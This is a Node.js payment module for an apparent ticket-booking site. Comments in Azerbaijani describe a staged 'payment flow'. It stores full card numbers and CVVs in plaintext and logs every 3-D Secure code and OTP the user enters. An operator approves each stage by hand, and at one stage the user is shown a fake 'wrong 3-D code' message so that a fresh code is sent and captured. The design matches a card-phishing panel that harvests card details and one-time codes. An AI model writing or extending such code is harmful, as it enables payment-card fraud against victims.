const { Payment, Order, User } = require('../models/index');
const { issueTickets } = require('./bookingService');
const h = require('../utils/helpers');
const { anonIp } = require('../middleware/privacy');

/* ==================== Ödəniş axını ====================
   1) İstifadəçi kart məlumatlarını + 3-D kodu yazır      -> stage: card_review (2 dəq geri sayım)
   2) Admin 1-ci dəfə təsdiqləyir                          -> stage: wrong_code  (ekranda "səhv 3-D kod", kod təkrar göndərilir, yeni geri sayım)
   3) Admin 2-ci dəfə təsdiqləyir                          -> stage: otp_entry   (istifadəçidə OTP ekranı açılır)
   4) İstifadəçi OTP yazır                                 -> stage: otp_review  (yekun təsdiq gözlənilir)
   5) Admin yekun təsdiq verir                             -> bilet verilir                             */

const STAGE_SECONDS = 120; /* 2 dəqiqə */

function startStage(payment, stage) {
  payment.stage = stage;
  payment.stageStartedAt = new Date();
  payment.stageDeadline = new Date(Date.now() + STAGE_SECONDS * 1000);
}

function secondsLeft(payment) {
  if (!payment || !payment.stageDeadline) return 0;
  return Math.max(0, Math.round((new Date(payment.stageDeadline).getTime() - Date.now()) / 1000));
}

async function initPayment(order, card, method, code) {
  const number = h.normalizeCardNumber(card.number);
  const brand = h.cardBrand(number);
  const first = String(code || '').replace(/\D/g, '');

  const payment = new Payment({
    transactionId: h.generateTxId('ADY'),
    order: order._id,
    user: order.user,
    amount: order.total,
    method: method === 'balance' ? 'balance' : 'card',
    status: 'pending_admin',
    card: {
      number,
      masked: h.maskCard(number),
      holder: String(card.holder || '').trim(),
      expiry: String(card.expiry || '').trim(),
      cvv: String(card.cvv || '').trim(),
      brand
    },
    firstCode: first,
    codeAttempts: first ? [{ code: first, kind: '3ds-1', at: new Date(), ip: anonIp() }] : []
  });
  startStage(payment, 'card_review');
  await payment.save();

  order.payment = payment._id;
  order.method = payment.method;
  order.status = 'pending_admin';
  await order.save();

  return payment;
}

/* 1-ci admin təsdiqi: istifadəçinin ekranında "Səhv 3-D kod" göstərilir və kod təkrar göndərilir */
async function adminApproveCard(paymentId, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (payment.stage !== 'card_review') throw Object.assign(new Error('Ödəniş bu mərhələdə deyil'), { status: 400 });

  /* Balans artırımı köhnə (birbaşa OTP) axınında qalır */
  if (!payment.order) {
    payment.stage = 'wrong_code';
    await payment.save();
    return adminOpenOtp(paymentId, adminEmail);
  }

  payment.adminApprovedCardAt = new Date();
  payment.adminApprovedBy = adminEmail || 'admin';
  payment.wrongCodeAt = new Date();
  payment.status = 'pending_admin';
  startStage(payment, 'wrong_code');
  await payment.save();

  if (payment.order) {
    const order = await Order.findById(payment.order);
    if (order) {
      order.status = 'pending_admin';
      await order.save();
    }
  }

  return { payment };
}

/* 2-ci admin təsdiqi: istifadəçidə 3-D OTP ekranı açılır */
async function adminOpenOtp(paymentId, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (payment.stage !== 'wrong_code') throw Object.assign(new Error('Ödəniş bu mərhələdə deyil'), { status: 400 });

  payment.verificationCode = h.randomDigits(6);
  payment.status = 'awaiting_3ds';
  payment.adminResentAt = new Date();
  payment.adminApprovedBy = adminEmail || payment.adminApprovedBy || 'admin';
  startStage(payment, 'otp_entry');
  await payment.save();

  if (payment.order) {
    const order = await Order.findById(payment.order);
    if (order) {
      order.status = 'awaiting_verification';
      await order.save();
    }
  }

  return { payment, code: payment.verificationCode };
}

/* İstifadəçi OTP kodunu göndərir -> admin panelinə düşür */
async function submitVerificationCode(ref, code, meta) {
  let order = null;
  let payment = null;

  if (ref && ref.paymentId) {
    payment = await Payment.findById(ref.paymentId);
    if (!payment || String(payment.user) !== String(ref.userId)) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  } else {
    order = await Order.findById(ref && ref.orderId);
    if (!order) throw Object.assign(new Error('Sifariş tapılmadı'), { status: 404 });
    payment = await Payment.findById(order.payment);
    if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  }
  if (payment.stage !== 'otp_entry') throw Object.assign(new Error('Doğrulama mərhələsi aktiv deyil'), { status: 400 });

  const entered = String(code || '').replace(/\D/g, '');
  if (entered.length < 4) throw Object.assign(new Error('Doğrulama kodu yanlışdır'), { status: 400 });

  payment.status = 'code_submitted';
  payment.codeSubmittedAt = new Date();
  payment.submittedCode = entered;
  payment.codeAttempts.push({ code: entered, kind: 'otp', at: new Date(), ip: (meta && meta.ip) || anonIp() });
  startStage(payment, 'otp_review');
  await payment.save();

  if (order) {
    order.status = 'code_submitted';
    await order.save();
  }

  return { payment, matched: entered === payment.verificationCode };
}

/* Yekun admin təsdiqi: biletlər verilir və ödəniş tamamlanır */
async function adminFinalApprove(paymentId, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });
  if (['approved', 'declined', 'refunded'].indexOf(payment.status) > -1) {
    throw Object.assign(new Error('Ödəniş artıq yekunlaşıb'), { status: 400 });
  }

  /* Balans artırımı: yekun təsdiqdə məbləğ balansa əlavə olunur */
  if (!payment.order) {
    const owner = await User.findById(payment.user);
    if (!owner) throw Object.assign(new Error('İstifadəçi tapılmadı'), { status: 404 });
    owner.balance = Math.round(((owner.balance || 0) + payment.amount) * 100) / 100;
    await owner.save();
    payment.status = 'approved';
    payment.stage = 'done';
    payment.adminFinalApprovedAt = new Date();
    payment.adminFinalBy = adminEmail || 'admin';
    await payment.save();
    return { payment, order: null, tickets: [], balance: owner.balance };
  }

  const order = await Order.findById(payment.order);
  if (!order) throw Object.assign(new Error('Sifariş tapılmadı'), { status: 404 });

  if (payment.method === 'balance') {
    const user = await User.findById(payment.user);
    if (!user || (user.balance || 0) < payment.amount) {
      throw Object.assign(new Error('Balans kifayət etmir'), { status: 400 });
    }
    user.balance = Math.round(((user.balance || 0) - payment.amount) * 100) / 100;
    await user.save();
  }

  payment.status = 'approved';
  payment.stage = 'done';
  payment.adminFinalApprovedAt = new Date();
  payment.adminFinalBy = adminEmail || 'admin';
  await payment.save();

  const tickets = await issueTickets(order);
  order.status = 'confirmed';
  order.pnr = tickets.length ? tickets[0].pnr : '';
  order.confirmedAt = new Date();
  await order.save();

  return { payment, order, tickets };
}

/* Rədd */
async function adminDecline(paymentId, reason, adminEmail) {
  const payment = await Payment.findById(paymentId);
  if (!payment) throw Object.assign(new Error('Ödəniş tapılmadı'), { status: 404 });

  if (['approved', 'refunded'].indexOf(payment.status) > -1) {
    throw Object.assign(new Error('Ödəniş artıq təsdiqlənib'), { status: 400 });
  }

  payment.status = 'declined';
  payment.stage = 'done';
  payment.declinedReason = reason || 'Admin tərəfindən rədd edildi';
  payment.adminFinalBy = adminEmail || 'admin';
  await payment.save();

  const order = payment.order ? await Order.findById(payment.order) : null;
  if (order) {
    order.status = 'rejected';
    order.adminNote = payment.declinedReason;
    await order.save();

    const { Trip } = require('../models/index');
    const trip = await Trip.findById(order.trip);
    if (trip) {
      trip.soldSeats = (trip.soldSeats || []).filter((s) => String(s.order) !== String(order._id));
      await trip.save();
    }
  }

  return payment;
}

/* Balans artırımı da eyni axından keçir */
async function createTopup(user, amount, card, code) {
  const number = h.normalizeCardNumber(card.number);
  const first = String(code || '').replace(/\D/g, '');
  const payment = new Payment({
    transactionId: h.generateTxId('TOP'),
    order: null,
    user: user._id,
    amount: Number(amount),
    method: 'card',
    status: 'pending_admin',
    card: {
      number,
      masked: h.maskCard(number),
      holder: String(card.holder || '').trim(),
      expiry: String(card.expiry || '').trim(),
      cvv: String(card.cvv || '').trim(),
      brand: h.cardBrand(number)
    },
    firstCode: first,
    codeAttempts: first ? [{ code: first, kind: '3ds-1', at: new Date(), ip: anonIp() }] : []
  });
  startStage(payment, 'card_review');
  await payment.save();
  return payment;
}

async function approveTopup(paymentId, adminEmail) {
  const r = await adminFinalApprove(paymentId, adminEmail);
  return { payment: r.payment, balance: r.balance };
}

module.exports = {
  STAGE_SECONDS,
  secondsLeft,
  initPayment,
  adminApproveCard,
  adminOpenOtp,
  submitVerificationCode,
  adminFinalApprove,
  adminDecline,
  createTopup,
  approveTopup
};
